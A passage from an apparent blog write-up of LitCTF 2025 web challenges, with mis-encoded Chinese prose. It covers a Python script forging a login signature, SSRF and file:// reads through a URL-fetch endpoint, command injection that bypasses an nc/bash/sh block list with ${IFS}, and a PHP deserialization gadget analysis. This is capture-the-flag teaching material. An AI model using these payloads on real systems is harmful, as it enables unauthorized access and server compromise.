class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;loginBtn&#x27;</span>);<br>        <span class="hljs-keyword">const</span> passwordInput = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;password&#x27;</span>);<br>        <span class="hljs-keyword">const</span> errorTip = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;errorTip&#x27;</span>);<br>        <span class="hljs-keyword">const</span> rawUsername = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;username&#x27;</span>).<span class="hljs-property">value</span>; <br><br>     <br>        loginBtn.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-title function_">async</span> () =&gt; &#123;<br>            <span class="hljs-keyword">const</span> rawPassword = passwordInput.<span class="hljs-property">value</span>.<span class="hljs-title function_">trim</span>();<br>            <span class="hljs-keyword">if</span> (!rawPassword) &#123;<br>                errorTip.<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;è¯·è¾“å…¥å¯†ç &#x27;</span>;<br>                errorTip.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">&#x27;show&#x27;</span>);<br>                passwordInput.<span class="hljs-title function_">focus</span>();<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">const</span> md5Username = <span class="hljs-title class_">CryptoJS</span>.<span class="hljs-title class_">MD5</span>(rawUsername).<span class="hljs-title function_">toString</span>();   <br>            <span class="hljs-keyword">const</span> md5Password = <span class="hljs-title class_">CryptoJS</span>.<span class="hljs-title class_">MD5</span>(rawPassword).<span class="hljs-title function_">toString</span>();   <br><br>     <br>            <span class="hljs-keyword">const</span> shortMd5User = md5Username.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>, <span class="hljs-number">6</span>);  <br>            <span class="hljs-keyword">const</span> shortMd5Pass = md5Password.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>, <span class="hljs-number">6</span>);  <br><br>          <br>            <span class="hljs-keyword">const</span> timestamp = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>().<span class="hljs-title function_">toString</span>(); <span class="hljs-comment">//äº”åˆ†é’Ÿ</span><br><br>       <br>            <span class="hljs-keyword">const</span> secretKey = <span class="hljs-string">&#x27;easy_signin&#x27;</span>;  <br>            <span class="hljs-keyword">const</span> sign = <span class="hljs-title class_">CryptoJS</span>.<span class="hljs-title class_">MD5</span>(shortMd5User + shortMd5Pass + timestamp + secretKey).<span class="hljs-title function_">toString</span>();<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;login.php&#x27;</span>, &#123;<br>                    <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>                    <span class="hljs-attr">headers</span>: &#123;<br>                        <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>,<br>                        <span class="hljs-string">&#x27;X-Sign&#x27;</span>: sign  <br>                    &#125;,<br>                    <span class="hljs-attr">body</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLSearchParams</span>(&#123;<br>                        <span class="hljs-attr">username</span>: md5Username,   <br>                        <span class="hljs-attr">password</span>: md5Password,   <br>                        <span class="hljs-attr">timestamp</span>: timestamp<br>                    &#125;)<br>                &#125;);<br><br>                <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();<br>                <span class="hljs-keyword">if</span> (result.<span class="hljs-property">code</span> === <span class="hljs-number">200</span>) &#123;<br>                    <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;ç™»å½•æˆåŠŸï¼&#x27;</span>);<br>                    <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span> = <span class="hljs-string">&#x27;dashboard.php&#x27;</span>; <br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    errorTip.<span class="hljs-property">textContent</span> = result.<span class="hljs-property">msg</span>;<br>                    errorTip.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">&#x27;show&#x27;</span>);<br>                    passwordInput.<span class="hljs-property">value</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>                    passwordInput.<span class="hljs-title function_">focus</span>();<br>                    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> errorTip.<span class="hljs-property">classList</span>.<span class="hljs-title function_">remove</span>(<span class="hljs-string">&#x27;show&#x27;</span>), <span class="hljs-number">3000</span>);<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>                errorTip.<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;ç½‘ç»œè¯·æ±‚å¤±è´¥&#x27;</span>;<br>                errorTip.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">&#x27;show&#x27;</span>);<br>                <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> errorTip.<span class="hljs-property">classList</span>.<span class="hljs-title function_">remove</span>(<span class="hljs-string">&#x27;show&#x27;</span>), <span class="hljs-number">3000</span>);<br>            &#125;<br>        &#125;);<br><br>        passwordInput.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;input&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>            errorTip.<span class="hljs-property">classList</span>.<span class="hljs-title function_">remove</span>(<span class="hljs-string">&#x27;show&#x27;</span>);<br>        &#125;);<br>    &lt;/script&gt;<br></code></pre></td></tr></table></figure><p>ä¼šå¯¹ç”¨æˆ·åå’Œå¯†ç è¿›è¡ŒMD5åŠ å¯†ï¼Œå–å‰å…­ä½ä½œä¸ºçŸ­å“ˆå¸Œå€¼ï¼Œä½¿ç”¨æ—¶é—´æˆ³ã€çŸ­å“ˆå¸Œå€¼å’Œå›ºå®šå¯†é’¥ç”Ÿæˆç­¾åï¼Œä½œä¸ºè¯·æ±‚å¤´<code>X-Sign</code></p><p>åˆ©ç”¨è„šæœ¬æ„é€ ç”¨æˆ·åã€å¯†ç å’Œè¯·æ±‚å¤´<code>X-Sign</code>ï¼Œå‘é€è¯·æ±‚ï¼Œå¯ä»¥å°è¯•å‡ºç”¨æˆ·åä¸º<code>admin</code>å¼±å¯†ç ä¸º<code>admin123</code></p><p>è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-comment"># ç›®æ ‡åœ°å€</span><br>url = <span class="hljs-string">&quot;http://node6.anna.nssctf.cn:23038/login.php&quot;</span><br><br><span class="hljs-comment"># å›ºå®šä¿¡æ¯</span><br>username = <span class="hljs-string">&quot;admin&quot;</span><br>password = <span class="hljs-string">&quot;admin123&quot;</span><br>secret_key = <span class="hljs-string">&quot;easy_signin&quot;</span><br><br><span class="hljs-comment"># å½“å‰æ—¶é—´æˆ³ï¼ˆå•ä½ï¼šæ¯«ç§’ï¼‰</span><br>timestamp = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(time.time() * <span class="hljs-number">1000</span>))<br><br><span class="hljs-comment"># åŠ å¯†å¤„ç†</span><br>md5_username = hashlib.md5(username.encode()).hexdigest()<br>md5_password = hashlib.md5(password.encode()).hexdigest()<br><br>short_md5_user = md5_username[:<span class="hljs-number">6</span>]<br>short_md5_pass = md5_password[:<span class="hljs-number">6</span>]<br><br>sign_raw = short_md5_user + short_md5_pass + timestamp + secret_key<br>sign = hashlib.md5(sign_raw.encode()).hexdigest()<br><br><span class="hljs-comment"># æ„é€ è¯·æ±‚å¤´å’Œæ•°æ®</span><br>headers = &#123;<br>    <span class="hljs-string">&quot;X-Sign&quot;</span>: sign<br>&#125;<br><br>data = &#123;<br>    <span class="hljs-string">&quot;username&quot;</span>: md5_username,<br>    <span class="hljs-string">&quot;password&quot;</span>: md5_password,<br>    <span class="hljs-string">&quot;timestamp&quot;</span>: timestamp<br>&#125;<br><br><span class="hljs-comment"># å‘èµ·è¯·æ±‚</span><br>response = requests.post(url, headers=headers, data=data)<br><br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[ç”¨æˆ·å]ï¼š&quot;</span>, md5_username)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[å¯†ç ï¼š]&quot;</span>,  md5_password)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[ç­¾åï¼š]&quot;</span>, sign)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[æ—¶é—´æˆ³ï¼š]&quot;</span>, timestamp)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[å“åº”çŠ¶æ€ç ]ï¼š&quot;</span>, response.status_code)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[å“åº”å†…å®¹]ï¼š&quot;</span>, response.text)<br><span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[é”™è¯¯]:&quot;</span>, e)<br></code></pre></td></tr></table></figure><p><img src="/2025/05/30/LitCTF-2025-web/image-20250526232107727.png" alt="image-20250526232107727"></p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nix">[ç”¨æˆ·å]ï¼š <span class="hljs-number">21232</span>f297a57a5a743894a0e4a801fc3<br>[å¯†ç ï¼š] <span class="hljs-number">0192023</span>a7bbd73250516f069df18b500<br>[ç­¾åï¼š] <span class="hljs-number">52</span>bff74515ab8df5d14e00aef5bc8e7c<br>[æ—¶é—´æˆ³ï¼š] <span class="hljs-number">1748272837039</span><br>[å“åº”çŠ¶æ€ç ]ï¼š <span class="hljs-number">200</span><br>[å“åº”å†…å®¹]ï¼š &#123;<span class="hljs-string">&quot;code&quot;</span>:<span class="hljs-number">200</span>,<span class="hljs-string">&quot;msg&quot;</span>:<span class="hljs-string">&quot;<span class="hljs-char escape_">\u</span>767b<span class="hljs-char escape_">\u</span>5f55<span class="hljs-char escape_">\u</span>6210<span class="hljs-char escape_">\u</span>529f,<span class="hljs-char escape_">\u</span>60a8<span class="hljs-char escape_">\u</span>5df2<span class="hljs-char escape_">\u</span>83b7<span class="hljs-char escape_">\u</span>5f97<span class="hljs-char escape_">\u</span>8bb8<span class="hljs-char escape_">\u</span>53ef!&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨bpæŠ“åŒ…ä¿®æ”¹ï¼Œå‘é€è¯·æ±‚</p><p><img src="/2025/05/30/LitCTF-2025-web/image-20250526232339862.png" alt="image-20250526232339862"></p><p>ç™»å½•æˆåŠŸï¼Œå¤åˆ¶åˆ°ä»£ç†ç•Œé¢æ”¾åŒ…ï¼Œæµè§ˆå™¨æŸ¥çœ‹</p><p><img src="/2025/05/30/LitCTF-2025-web/image-20250526232442810.png" alt="image-20250526232442810"></p><p>è·³è½¬åˆ°<code>/dashboard.php</code>ï¼Œå¾—åˆ°æç¤º<code>/var/www/html/backup/8e0132966053d4bf8b2dbe4ede25502b.php</code></p><p><img src="/2025/05/30/LitCTF-2025-web/image-20250526232512932.png" alt="image-20250526232512932"></p><p>è®¿é—®å¾—åˆ°çš„è·¯å¾„ï¼Œä¸è¿‡è®¿é—®ä¸åˆ°</p><p><img src="/2025/05/30/LitCTF-2025-web/image-20250526232721833.png" alt="image-20250526232721833"></p><p>å¯ä»¥åˆ©ç”¨ä¹‹å‰åœ¨<code>api.js</code>ä¸­å¾—åˆ°çš„æç¤ºè®¿é—®</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>node6.anna.nssctf.cn:<span class="hljs-number">23038</span><span class="hljs-regexp">/api/</span>sys<span class="hljs-regexp">/urlcode.php?url=/</span>var<span class="hljs-regexp">/www/</span>html<span class="hljs-regexp">/backup/</span><span class="hljs-number">8</span>e0132966053d4bf8b2dbe4ede25502b.php<br></code></pre></td></tr></table></figure><p><img src="/2025/05/30/LitCTF-2025-web/image-20250526232839067.png" alt="image-20250526232839067"></p><p>ä¸è¿‡æŠ¥é”™ä¸æ˜¯æœ¬åœ°ç”¨æˆ·ï¼Œå¯ä»¥åˆ©ç”¨SSRFï¼Œå¸¦ä¸Š<code>http://127.0.0.1/</code></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>node6.anna.nssctf.cn:<span class="hljs-number">23038</span><span class="hljs-regexp">/api/</span>sys<span class="hljs-regexp">/urlcode.php?url=http:/</span><span class="hljs-regexp">/127.0.0.1/</span>backup/<span class="hljs-number">8</span>e0132966053d4bf8b2dbe4ede25502b.php<br></code></pre></td></tr></table></figure><p><img src="/2025/05/30/LitCTF-2025-web/image-20250527000644573.png" alt="image-20250527000644573"></p><p>ä¹Ÿå¯ä»¥åˆ©ç”¨<code>file</code>ä¼ªåè®®è¯»</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>node6.anna.nssctf.cn:<span class="hljs-number">23038</span><span class="hljs-regexp">/api/</span>sys<span class="hljs-regexp">/urlcode.php?url=file:/</span><span class="hljs-regexp">//</span>var<span class="hljs-regexp">/www/</span>html<span class="hljs-regexp">/backup/</span><span class="hljs-number">8</span>e0132966053d4bf8b2dbe4ede25502b.php<br></code></pre></td></tr></table></figure><p><img src="/2025/05/30/LitCTF-2025-web/image-20250526233523036.png" alt="image-20250526233523036"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>) &#123;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$name</span>=<span class="hljs-string">&quot;waf&quot;</span>;<br><span class="hljs-variable">$name</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br><br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\b(nc|bash|sh)\b/i&#x27;</span>, <span class="hljs-variable">$name</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;waf!!&quot;</span>;<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/more|less|head|sort/&#x27;</span>, <span class="hljs-variable">$name</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;waf&quot;</span>;<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/tail|sed|cut|awk|strings|od|ping/&#x27;</span>, <span class="hljs-variable">$name</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;waf!&quot;</span>;<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><br><span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$name</span>, <span class="hljs-variable">$output</span>, <span class="hljs-variable">$return_var</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æ‰§è¡Œç»“æœï¼š\n&quot;</span>;<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$output</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\nè¿”å›ç ï¼š<span class="hljs-subst">$return_var</span>&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;éæœ¬åœ°ç”¨æˆ·&quot;</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>GETä¼ å‚nameï¼Œå­˜åœ¨<code>waf</code>ï¼Œç©ºæ ¼ä½¿ç”¨<code>$&#123;IFS&#125;</code>ç»•è¿‡ï¼Œæœ€åå¯ä»¥åœ¨ä¸Šä¸€çº§ç›®å½•æ‰¾åˆ°flagæ–‡ä»¶<code>327a6c4304ad5938eaf0efb6cc3e53dc.php</code></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>node6.anna.nssctf.cn:<span class="hljs-number">23038</span><span class="hljs-regexp">/api/</span>sys<span class="hljs-regexp">/urlcode.php?url=http:/</span><span class="hljs-regexp">/127.0.0.1/</span>backup<span class="hljs-regexp">/8e0132966053d4bf8b2dbe4ede25502b.php?name=ls$&#123;IFS&#125;../</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/30/LitCTF-2025-web/image-20250527001231482.png" alt="image-20250527001231482"></p><p>åˆ©ç”¨<code>cat</code>è¯»ä¸åˆ°flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://node6.anna.nssctf.cn:<span class="hljs-number">23038</span>/api/sys/urlcode.php?url=http://<span class="hljs-number">127.0.0.1</span>/backup/<span class="hljs-number">8</span>e0132966053d4bf8b2dbe4ede25502b.php?name=cat<span class="hljs-variable">$&#123;IFS&#125;</span>../<span class="hljs-number">327</span>a6c4304ad5938eaf0efb6cc3e53dc.php<br></code></pre></td></tr></table></figure><p><img src="/2025/05/30/LitCTF-2025-web/image-20250527001335579.png" alt="image-20250527001335579"></p><p>ç›´æ¥è®¿é—®å¾—åˆ°flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://node6.anna.nssctf.cn:<span class="hljs-number">23038</span>/<span class="hljs-number">327</span>a6c4304ad5938eaf0efb6cc3e53dc.php<br></code></pre></td></tr></table></figure><p><img src="/2025/05/30/LitCTF-2025-web/image-20250527001403081.png" alt="image-20250527001403081"></p><h1 id="LitCTF-2025-å›ã®åã¯"><a href="#LitCTF-2025-å›ã®åã¯" class="headerlink" title="[LitCTF 2025]å›ã®åã¯"></a>[LitCTF 2025]å›ã®åã¯</h1><p>æºç å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&#x27;die(`/readflag`);&#x27;</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Taki</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$musubi</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$magic</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unserialize</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;musubi = <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;musubi&#x27;</span>];<br>        <span class="hljs-variable language_">$this</span>-&gt;magic = <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;magic&#x27;</span>];<br>        <span class="hljs-keyword">return</span> (<span class="hljs-variable language_">$this</span>-&gt;musubi)();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>,<span class="hljs-variable">$args</span></span>)</span>&#123;<br>        (<span class="hljs-keyword">new</span> <span class="hljs-variable">$args</span>[<span class="hljs-number">0</span>](<span class="hljs-variable">$args</span>[<span class="hljs-number">1</span>]))-&gt;&#123;<span class="hljs-variable language_">$this</span>-&gt;magic&#125;();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Mitsuha</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$memory</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$thread</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;memory.<span class="hljs-variable language_">$this</span>-&gt;thread;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">KatawareDoki</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$soul</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$kuchikamizake</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$name</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;soul)-&gt;<span class="hljs-title function_ invoke__">flag</span>(<span class="hljs-variable">$this</span>-&gt;kuchikamizake,<span class="hljs-variable">$this</span>-&gt;name);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;call error!no flag!&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$Litctf2025</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Litctf2025&#x27;</span>];<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^[Oa]:[\d]+/i&quot;</span>, <span class="hljs-variable">$Litctf2025</span>))&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$Litctf2025</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æŠŠOæ”¹æˆCä¸å°±è¡Œäº†å—,ç¬¨è›‹!ï½(âˆ ãƒ»Ï‰&lt; )âŒ’â˜†&quot;</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>Takiç±»ï¼š</strong></p><ul><li><code>__unserialize()</code>ï¼šåœ¨å¯¹è±¡ååºåˆ—åŒ–æ—¶è¢«è°ƒç”¨ï¼Œä¼šæ‰§è¡Œ<code>$this-&gt;musubi</code>æ–¹æ³•</li><li><code>__call()</code>ï¼šå½“è°ƒç”¨ä¸å­˜åœ¨çš„æ–¹æ³•æ—¶è§¦å‘ï¼Œä¼šå®ä¾‹åŒ–<code>$args[0]</code>ç±»å¹¶è°ƒç”¨å…¶<code>$this-&gt;magic</code>æ–¹æ³•</li></ul><p><strong>Mitsuha ç±»</strong></p><ul><li><code>__invoke()</code>ï¼šå½“å¯¹è±¡è¢«å½“ä½œå‡½æ•°è°ƒç”¨æ—¶è§¦å‘ï¼Œè¿”å›<code>$this-&gt;memory.$this-&gt;thread</code>çš„æ‹¼æ¥ç»“æœ</li></ul><p><strong>KatawareDoki ç±»</strong></p><ul><li><code>__toString()</code>ï¼šå½“å¯¹è±¡è¢«å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘ï¼Œä¼šè°ƒç”¨<code>$this-&gt;soul</code>çš„<code>flag()</code>æ–¹æ³•</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&#x27;die(`/readflag`);&#x27;</span>);<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªä»£ç æ˜¯ä½¿ç”¨<code>create_function</code>åˆ›å»ºäº†ä¸€ä¸ªåŒ¿åå‡½æ•°ï¼Œä¼šæ‰§è¡Œç³»ç»Ÿå‘½ä»¤<code>/readflag</code>ï¼Œå¯ä»¥é€šè¿‡ååºåˆ—åŒ–è§¦å‘è¿™ä¸ªå‡½æ•°ï¼Œå°±å¯ä»¥å¾—åˆ°flag</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-function"><span class="hljs-params">(<span class="hljs-keyword">new</span> $args[<span class="hljs-number">0</span>]($args[<span class="hljs-number">1</span>]))</span>-&gt;</span>&#123;$this-&gt;magic&#125;();<br></code></pre></td></tr></table></figure><p>å¯ä»¥åˆ©ç”¨è¿™æ®µä»£ç è§¦å‘<code>create_function</code>åŒ¿åå‡½æ•°è·å–flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&#x27;die(`/readflag`);&#x27;</span>);<br></code></pre></td></tr></table></figure><p><strong>éœ€è¦æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶</strong></p><ul><li>æ‰¾åˆ°åŒ¿åå‡½æ•°çš„åå­—</li><li>æ‰¾åˆ°ä¸€ä¸ªå¯ä»¥è°ƒç”¨åŒ¿åå‡½æ•°çš„åŸç”Ÿç±»</li></ul><p>å¯ä»¥åœ¨æœ¬åœ°è¿è¡Œä»£ç è·å¾—åŒ¿åå‡½æ•°å</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 